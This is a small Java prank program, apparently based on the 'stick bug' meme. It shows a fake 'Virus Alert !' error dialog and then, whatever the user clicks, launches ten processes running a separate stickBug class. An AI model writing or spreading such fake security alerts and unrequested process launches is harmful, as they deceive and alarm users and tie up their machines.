import java.io.BufferedReader;
import java.io.InputStreamReader;
import javax.swing.JOptionPane;

public class stickBugged {

    static void stickBug() {
        try {
            ProcessBuilder builder = new ProcessBuilder("java", "-cp", ".", "stickBug");
            Process process = builder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
            System.out.println("Error running stickBug method.");
        }
    }

    public static void main(String[] args) {
        int response = JOptionPane.showOptionDialog(
            null,
            "Get stick bugged lol",
            "Virus Alert !",
            JOptionPane.YES_NO_CANCEL_OPTION,
            JOptionPane.ERROR_MESSAGE,
            null,
            null,
            null
        );

        if (response == JOptionPane.YES_OPTION || response == JOptionPane.NO_OPTION || response == JOptionPane.CANCEL_OPTION) {
            for (int i = 0; i < 10; i++) { 
                new Thread(() -> stickBug()).start();
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}